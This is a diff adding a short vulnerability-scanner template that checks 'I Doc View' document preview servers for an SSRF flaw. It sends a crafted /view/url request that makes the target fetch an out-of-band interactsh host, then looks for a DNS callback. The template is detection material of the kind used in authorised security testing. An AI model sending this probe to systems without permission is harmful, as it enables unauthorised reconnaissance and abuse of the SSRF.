@@ -1,0 +1,17 @@
+id: poc-yaml-idocv-view-url-anyfile-read
+info:
+  name: "I Doc View Online Document Preview SSRF 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: I Doc View
+http:
+  - raw:
+      - |
+        GET /view/url?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
